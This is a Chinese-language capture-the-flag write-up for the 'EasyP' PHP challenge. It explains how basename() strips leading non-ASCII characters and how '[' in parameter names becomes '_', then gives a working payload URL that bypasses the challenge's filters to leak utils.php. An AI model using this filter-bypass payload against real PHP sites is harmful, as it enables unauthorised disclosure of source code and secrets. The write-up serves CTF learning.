**源码：**

```
<?php
include 'utils.php';

if (isset($_POST['guess'])) {
    $guess = (string) $_POST['guess'];
    if ($guess === $secret) {
        $message = 'Congratulations! The flag is: ' . $flag;
    } else {
        $message = 'Wrong. Try Again';
    }
}

if (preg_match('/utils\.php\/*$/i', $_SERVER['PHP_SELF'])) {
    exit("hacker :)");
}

if (preg_match('/show_source/', $_SERVER['REQUEST_URI'])){
    exit("hacker :)");
}

if (isset($_GET['show_source'])) {
    highlight_file(basename($_SERVER['PHP_SELF']));
    exit();
}else{
    show_source(__FILE__);
}
?> 
```

读下代码应该是让index.php利用highlight_file函数回显utils.php的内容，但是当以utils.php结尾被waf了



#### 知识点：

```
$_SERVER['PHP_SELF'] in a script at the address http://example.com/foo/bar.php would be /foo/bar.php.

$_SERVER['REQUEST_URI']:The URI which was given in order to access this page; for instance, '/index.html'.

basename()  返回路径中的文件名部分

当使用默认区域设置“C”，basename() 会删除文件名开头的非 ASCII 字符
```

https://bugs.php.net/bug.php?id=62119

在本地写个脚本测试一下，成功得到utils.php

![image-20231130161410117]([鹤城杯 2021]EasyP.assets\image-20231130161410117.png)



再参照非法字符传参，如果参数中出现中括号`[`，中括号会被转换成下划线`_`

所以payload为：

```
http://node4.anna.nssctf.cn:28830/index.php/utils.php/你好?show[source=1
```



参考文章：https://www.cnblogs.com/yesec/p/15429527.html
